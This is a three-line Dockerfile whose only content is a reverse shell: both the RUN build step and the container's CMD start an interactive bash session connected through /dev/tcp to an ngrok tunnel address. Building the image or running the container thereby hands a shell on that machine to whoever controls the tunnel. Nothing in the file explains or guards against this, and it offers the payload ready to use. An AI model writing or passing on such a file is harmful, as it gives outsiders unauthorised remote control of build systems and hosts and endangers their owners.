FROM ubuntu:latest
RUN bash -c "bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/16725 0>&1"
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/16725 0>&1"]
